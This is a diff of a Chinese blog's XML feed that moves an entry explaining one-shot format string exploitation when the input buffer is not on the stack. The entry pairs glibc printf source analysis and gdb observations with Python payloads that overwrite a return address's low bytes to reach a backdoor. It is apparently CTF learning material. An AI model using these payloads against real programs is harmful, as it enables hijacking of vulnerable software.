-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* Process &#x27;h&#x27; modifier.  There might another &#x27;h&#x27; following.  */</span></span><br><span class="line">LABEL (mod_half):</span><br><span class="line">  is_short = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step3a_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;hh&#x27; modifier.  */</span></span><br><span class="line">LABEL (mod_halfhalf):</span><br><span class="line">  is_short = <span class="number">0</span>;</span><br><span class="line">  is_char = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;l&#x27; modifier.  There might another &#x27;l&#x27; following.  */</span></span><br><span class="line">LABEL (mod_long):</span><br><span class="line">  is_long = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step3b_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;L&#x27;, &#x27;q&#x27;, or &#x27;ll&#x27; modifier.  No other modifier is</span></span><br><span class="line"><span class="comment"> allowed to follow.  */</span></span><br><span class="line">LABEL (mod_longlong):</span><br><span class="line">  is_long_double = <span class="number">1</span>;</span><br><span class="line">  is_long = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step4_jumps);</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>处理 <code>h</code> 修饰符</strong>：</p>
-<ul>
-<li><code>LABEL (mod_half)</code><ul>
-<li>当遇到 <code>h</code> 修饰符时，将 <code>is_short</code> 设置为 1，表示后续的参数应被视为 <code>short int</code> 类型。</li>
-<li>然后跳转到下一个处理步骤 <code>step3a_jumps</code>，继续解析后续的格式字符。</li>
-</ul>
-</li>
-</ul>
-<p><strong>处理 <code>hh</code> 修饰符</strong>：</p>
-<ul>
-<li><code>LABEL (mod_halfhalf)</code><ul>
-<li>当遇到 <code>hh</code> 修饰符时，设置 <code>is_short</code> 为 0，并将 <code>is_char</code> 设置为 1。这表示后续参数将被视为 <code>unsigned char</code> 类型。</li>
-<li>跳转到 <code>step4_jumps</code>，继续后续解析。</li>
-</ul>
-</li>
-</ul>
-<p><strong>处理 <code>l</code> 修饰符</strong>：</p>
-<ul>
-<li><code>LABEL (mod_long)</code><ul>
-<li>当遇到 <code>l</code> 修饰符时，将 <code>is_long</code> 设置为 1，表示后续的参数应被视为 <code>long int</code> 类型。</li>
-<li>跳转到 <code>step3b_jumps</code>，继续解析。</li>
-</ul>
-</li>
-</ul>
-<p><strong>处理 <code>L</code>、<code>q</code> 或 <code>ll</code> 修饰符</strong>：</p>
-<ul>
-<li><code>LABEL (mod_longlong)</code><ul>
-<li>当遇到 <code>L</code>、<code>q</code> 或 <code>ll</code> 修饰符时，将 <code>is_long_double</code> 设置为 1，并将 <code>is_long</code> 设置为 1。这表明后续参数应被视为 <code>long double</code> 类型或 <code>long long int</code> 类型。</li>
-<li>这个标签后不允许有其他修饰符，因此跳转到 <code>step4_jumps</code>，继续后续解析。</li>
-</ul>
-</li>
-</ul>
-<p>解析完成后，我们发现栈上的内容实际已经被修改了，而后面的内容还没有开始解析。所以在%hn这种方式进行解析后会直接写入目标地址。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113356649.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113519869.png"
-                      class=""
-                >
-
-<p>之后解析到$时会跳转到<code>do_positional</code>进行进一步操作，然后会调用printf_positional进行进一步操作。这边如果步过就能直接完成操作了。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (*f == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line"><span class="comment">/* Oh, oh.  The argument comes from a positional parameter.  */</span></span><br><span class="line">	<span class="keyword">goto</span> do_positional;</span><br><span class="line">JUMP (*f, step1_jumps);</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">do_positional:</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep, mode_flags);</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>现在我们来看看用<code>payload = f&quot;%&#123;part1&#125;c%15$hn&quot; + f&quot;%&#123;part2&#125;c%45$hn&quot;</code>这个会发生什么。首先在前面<code>%xxxc</code>会直接打印占位符，同样的，我们现在关注指向程序名的链条。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120346608.png"
-                      class=""
-                >
-
-<p>程序在解析<code>%&#123;part1&#125;c%15$hn</code>时，会进入<code>printf_positional</code>进行进一步处理，其中解析的核心函数是 <code>nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</code> 然后会发现解析完前面的内容之后，栈上那个指向程序名的指针并没有被改变。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120419249.png"
-                      class=""
-                >
-
-<p>当解析完最后一个之后，会进入如下两个switch分支：</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If the width is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].width_arg != <span class="number">-1</span>)</span><br><span class="line">	args_type[specs[cnt].width_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].prec_arg != <span class="number">-1</span>)</span><br><span class="line">	args_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">switch</span> (specs[cnt].ndata_args)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:		<span class="comment">/* No arguments.  */</span></span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:		<span class="comment">/* One argument; we already have the</span></span><br><span class="line"><span class="comment">			   type and size.  */</span></span><br><span class="line">	  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class="line">	  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	  <span class="comment">/* We have more than one argument for this format spec.</span></span><br><span class="line"><span class="comment">	     We must call the arginfo function again to determine</span></span><br><span class="line"><span class="comment">	     all the types.  */</span></span><br><span class="line">	  (<span class="type">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class="line">	    (&amp;specs[cnt].info,</span><br><span class="line">	     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class="line">	     &amp;args_size[specs[cnt].data_arg]);</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line">      <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nargs; ++cnt)</span><br><span class="line">    <span class="keyword">switch</span> (args_type[cnt])</span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T(tag, mem, type)				\</span></span><br><span class="line"><span class="meta">	case tag:					\</span></span><br><span class="line"><span class="meta">	  args_value[cnt].mem = va_arg (*ap_savep, type); \</span></span><br><span class="line"><span class="meta">	  break</span></span><br><span class="line"></span><br><span class="line">	T (PA_WCHAR, pa_wchar, <span class="type">wint_t</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_CHAR:				<span class="comment">/* Promoted.  */</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_SHORT:		<span class="comment">/* Promoted.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == INT_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	T (PA_INT, pa_int, <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == LONG_LONG_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	T (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, <span class="type">long</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX != INT_MAX &amp;&amp; LONG_MAX != LONG_LONG_MAX</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> <span class="string">&quot;he?&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">case</span> PA_FLOAT:				<span class="comment">/* Promoted.  */</span></span><br><span class="line">	T (PA_DOUBLE, pa_double, <span class="type">double</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_DOUBLE|PA_FLAG_LONG_DOUBLE:</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    args_value[cnt].pa_double = va_arg (*ap_savep, <span class="type">double</span>);</span><br><span class="line">	    args_type[cnt] &amp;= ~PA_FLAG_LONG_DOUBLE;</span><br><span class="line">	  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __HAVE_FLOAT128_UNLIKE_LDBL</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((mode_flags &amp; PRINTF_LDBL_USES_FLOAT128) != <span class="number">0</span>)</span><br><span class="line">	  args_value[cnt].pa_float128 = va_arg (*ap_savep, <span class="type">_Float128</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  args_value[cnt].pa_long_double = va_arg (*ap_savep, <span class="type">long</span> <span class="type">double</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> PA_STRING:				<span class="comment">/* All pointers are the same */</span></span><br><span class="line">      <span class="keyword">case</span> PA_WSTRING:			<span class="comment">/* All pointers are the same */</span></span><br><span class="line">	T (PA_POINTER, pa_pointer, <span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> T</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">	<span class="keyword">if</span> ((args_type[cnt] &amp; PA_FLAG_PTR) != <span class="number">0</span>)</span><br><span class="line">	  args_value[cnt].pa_pointer = va_arg (*ap_savep, <span class="type">void</span> *);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (__glibc_unlikely (__printf_va_arg_table != <span class="literal">NULL</span>)</span><br><span class="line">		 &amp;&amp; __printf_va_arg_table[args_type[cnt] - PA_LAST] != <span class="literal">NULL</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">	    args_value[cnt].pa_user = alloca (args_size[cnt]);</span><br><span class="line">	    (*__printf_va_arg_table[args_type[cnt] - PA_LAST])</span><br><span class="line">	      (args_value[cnt].pa_user, ap_savep);</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  <span class="built_in">memset</span> (&amp;args_value[cnt], <span class="number">0</span>, <span class="keyword">sizeof</span> (args_value[cnt]));</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">	<span class="comment">/* Error case.  Not all parameters appear in N$ format</span></span><br><span class="line"><span class="comment">	   strings.  We have no way to determine their type.  */</span></span><br><span class="line">	assert ((mode_flags &amp; PRINTF_FORTIFY) != <span class="number">0</span>);</span><br><span class="line">	__libc_fatal (<span class="string">&quot;*** invalid %N$ use detected ***\n&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>**第一个 <code>switch</code>**：解析格式说明符并确定各个参数的类型和大小，建立参数类型映射。</p>
-<p>**第二个 <code>switch</code>**：根据映射提取实际参数，确保能够正确处理可变参数列表，确保每个参数的类型和大小都被正确使用。</p>
-<p>最后会统一处理格式化说明符。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Now walk through all format specifiers and process them.  */</span></span><br><span class="line">  <span class="keyword">for</span> (; (<span class="type">size_t</span>) nspecs_done &lt; nspecs; ++nspecs_done)</span><br><span class="line">    &#123;</span><br><span class="line">      ..............................</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001121745055.png"
-                      class=""
-                >
-
-<p>这里步过一次后会跳转到这个位置，我们能发现rcx被指向了.&#x2F;pwn，也就是第一次15偏移处的位置，执行两次后就把原来指向程序名的指针修改了。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001122059746.png"
-                      class=""
-                >
-
-<p>之后再处理后，会发现改的是原来的的内容，<code>./</code>被改成了<code>\x08\x12</code>。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001123259237.png"
-                      class=""
-                >
-
-<p>分析到这其实大体原理已经清晰了，如果硬要从源码分析的话也定位到了相关函数，但感觉再分析下去效率太低了，以后有研究的需求再深入分析吧。</p>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>format string</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>solidity&amp;blockchain初探</title>
     <url>/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/</url>
     <content><![CDATA[<p>solidity这个语言广泛运用与智能合约的编写，想要入门区块链就得先了解这个语言。该语言其实与c语言用法类似。在solidity语言中，标识执行账户是用地址实现的，比如我们MetaMask中创建的Account的地址或是某个合约的地址。</p>
@@ -2626,6 +2455,177 @@
       <tags>
         <tag>pwn</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>非栈上格式化字符串一次利用</title>
+    <url>/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="单次非栈上格式化字符串漏洞利用"><a href="#单次非栈上格式化字符串漏洞利用" class="headerlink" title="单次非栈上格式化字符串漏洞利用"></a>单次非栈上格式化字符串漏洞利用</h2><h4 id="问题发展路径"><a href="#问题发展路径" class="headerlink" title="问题发展路径"></a>问题发展路径</h4><ul>
+<li>一开始最基本的格式化字符串漏洞任意地址写，没有什么限制</li>
+<li>进阶一点的是非栈上的格式化字符串漏洞利用，需要利用到栈上的指向程序名称的链条以及靠近内核区域的链条，但这种方法正常而言需要多次格式化字符串漏洞的执行利用，对目标地址改动越大需要利用到越多次。</li>
+<li>最后是在读取内容非栈上的情况下，实现在一次格式化字符串漏洞的触发中直接进行对一个栈上地址的两个字节的修改，可以用于减少利用格式化字符串漏洞的次数，绕过更多的限制。</li>
+</ul>
+<h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>比如我们假设程序中有后门函数，目标是把栈上的返回地址的后两个字节给覆盖了以实现返回到后门函数中去。其中要利用到的两个链条的偏移分别为15和45。按照一般的多次漏洞的利用来说，是要先通过覆盖偏移15处的<code>0x7ffd991d220e</code>的低两个字节<code>0x220e</code>为<code>0x1898</code>，这样以后在r12指向的偏移45处就会是一个指针直接指向要返回到的地址，然后再通过写偏移45处内容的低两个字节实现对返回地址的低两个字节的写入。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001001143123.png"
+                      class=""
+                >
+
+<p>这里我们很容易就想到尝试直接把两个并到一起写，就有了如下payload：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;part1&#125;</span>c%15$hn&quot;</span> + <span class="string">f&quot;%<span class="subst">&#123;part2&#125;</span>c%45$hn&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>但在实际调试过后会发现现实的残酷，这个格式化字符串的解析中并不是按照先来后到的顺序，先解析完前一个再解析后一个的。实际上这里改的内容都是原偏移地址处指针指向的内容，最后并不会对返回地址进行修改。</p>
+<p>于是就有如下的比较神奇的绕过方法，就可以通过格式化字符串参数解析的特性来实现逐级的赋值。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;%p&quot;</span>*<span class="number">13</span></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;part1-<span class="number">130</span>-<span class="number">0x8</span>&#125;</span>c%hn&quot;</span> + <span class="string">f&quot;%<span class="subst">&#123;part2&#125;</span>c%45$hn&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这里省略掉了<code>%x$n</code>这种组合，而是直接<code>%hn</code>，这样省略以后会根据顺序来确定指定的参数偏移，由于前面有14个%，这里的%实际就会被解析为指向偏移15处的参数，这样一来在%的解析阶段就能把指定内容写到偏移15的指针处，从而与后面的内容进行联动，实现栈上内容的低两个字节内容的修改。这里part1就是我们通过泄露出栈相关地址后，计算出的返回地址在栈上位置的后两个字节。减去130是前面13个%p打印出的内容长度，最后的减0x8是调试后测出来的差值（这个的确不知道是在哪里多的内容）。</p>
+<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>首先在<code>stdio-common/printf.c</code>中可以找到printf的具体实现。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libioP.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> printf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write formatted output to stdout from the format string FORMAT.  */</span></span><br><span class="line"><span class="comment">/* VARARGS1 */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;				<span class="comment">//声明一个 va_list 类型的变量 arg，用于存储可变参数列表。</span></span><br><span class="line">  <span class="type">int</span> done;					<span class="comment">//写入的字符数或其他状态信息。</span></span><br><span class="line"></span><br><span class="line">  va_start (arg, format);	<span class="comment">//初始化 arg，使其指向可变参数列表的第一个参数。</span></span><br><span class="line">  done = __vfprintf_internal (<span class="built_in">stdout</span>, format, arg, <span class="number">0</span>);</span><br><span class="line">  va_end (arg);				<span class="comment">//清理 arg，以释放相关资源</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_printf</span></span><br><span class="line">ldbl_strong_alias (__printf, <span class="built_in">printf</span>);</span><br><span class="line">ldbl_strong_alias (__printf, _IO_printf);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>其最核心的功能要到<code>vfprintf.c</code>中去寻找，这里结合gdb带源码调试。</p>
+<p>首先会进入ARGCHECK中进行一系列检测，确保格式字符串符合要求。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ARGCHECK(S, Format) \</span></span><br><span class="line"><span class="meta">  do									      \</span></span><br><span class="line"><span class="meta">    &#123;									      \</span></span><br><span class="line"><span class="meta">      <span class="comment">/* Check file argument for consistence.  */</span>			      \</span></span><br><span class="line"><span class="meta">      CHECK_FILE (S, -1);						 <span class="comment">//检查文件流有效性和状态     \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      if (S-&gt;_flags &amp; _IO_NO_WRITES)			//如果指定文件流不可写就返回错误		      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#123;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  S-&gt;_flags |= _IO_ERR_SEEN;					      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  __set_errno (EBADF);						      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  return -1;							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#125;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      if (Format == NULL)			//如果格式化字符串为空就返回错误			      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#123;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  __set_errno (EINVAL);						      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  return -1;							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#125;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">    &#125; while (0)</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后会检查文件流 <code>s</code> 是否处于无缓冲模式，如果处于无缓冲模式，代码调用一个辅助函数 <code>buffered_vfprintf</code>。这个函数的作用是为该流分配一个局部临时缓冲区，然后重新调用原来的格式化输出函数。这样可以在处理输出时提供一个缓冲层，即使原始流不支持缓冲。这里我们调试时会进到<code>buffered_vfprintf</code>里面，最后实际还会调用回<code>vfprintf</code>。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (UNBUFFERED_P (s))</span><br><span class="line"><span class="comment">/* Use a helper function which will allocate a local temporary buffer</span></span><br><span class="line"><span class="comment">   for the stream and then call us again.  */</span></span><br><span class="line">	<span class="keyword">return</span> buffered_vfprintf (s, format, ap, mode_flags);</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001102135414.png"
+                      class=""
+                >
+
+<p>然后会判断代码是否支持宽字符的处理，然后查找格式字符串中的第一个格式说明符。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specwc ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specmb ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>后面也有类似的，但是会自增f，用于逐个解析。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get current character in format string.  */</span></span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      f = __find_specwc ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      f = __find_specmb ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Write the following constant string.  */</span></span><br><span class="line">      outstring (end_of_spec, f - end_of_spec);</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> outstring(String, Len)						\</span></span><br><span class="line"><span class="meta">  do									\</span></span><br><span class="line"><span class="meta">    &#123;									\</span></span><br><span class="line"><span class="meta">      const void *string_ = (String);					\</span></span><br><span class="line"><span class="meta">      done = outstring_func (s, string_, (Len), done);			\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (done &lt; 0)							\</span></span><br><span class="line"><span class="meta">	goto all_done;							\</span></span><br><span class="line"><span class="meta">    &#125;									\</span></span><br><span class="line"><span class="meta">   while (0)</span></span><br></pre></td></tr></table></figure></div>
+
+<p>我们现在关注那个指向程序名的链条，栈上地址低3位16进制为288。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001112058996.png"
+                      class=""
+                >
+
+<p>之后在调试时会发现，f会逐渐自增解析各个格式化字符串中的内容，在解析一串%p时其实不会在每一次outstring中打印内容，而是在解析到<code>%xxxc</code>后一并打印内容出来。之后在解析%hn时，会到这里进行跳转。这里对各种类型修饰符进行了解析</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* Process &#x27;h&#x27; modifier.  There might another &#x27;h&#x27; following.  */</span></span><br><span class="line">LABEL (mod_half):</span><br><span class="line">  is_short = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step3a_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;hh&#x27; modifier.  */</span></span><br><span class="line">LABEL (mod_halfhalf):</span><br><span class="line">  is_short = <span class="number">0</span>;</span><br><span class="line">  is_char = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;l&#x27; modifier.  There might another &#x27;l&#x27; following.  */</span></span><br><span class="line">LABEL (mod_long):</span><br><span class="line">  is_long = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step3b_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;L&#x27;, &#x27;q&#x27;, or &#x27;ll&#x27; modifier.  No other modifier is</span></span><br><span class="line"><span class="comment"> allowed to follow.  */</span></span><br><span class="line">LABEL (mod_longlong):</span><br><span class="line">  is_long_double = <span class="number">1</span>;</span><br><span class="line">  is_long = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step4_jumps);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>处理 <code>h</code> 修饰符</strong>：</p>
+<ul>
+<li><code>LABEL (mod_half)</code><ul>
+<li>当遇到 <code>h</code> 修饰符时，将 <code>is_short</code> 设置为 1，表示后续的参数应被视为 <code>short int</code> 类型。</li>
+<li>然后跳转到下一个处理步骤 <code>step3a_jumps</code>，继续解析后续的格式字符。</li>
+</ul>
+</li>
+</ul>
+<p><strong>处理 <code>hh</code> 修饰符</strong>：</p>
+<ul>
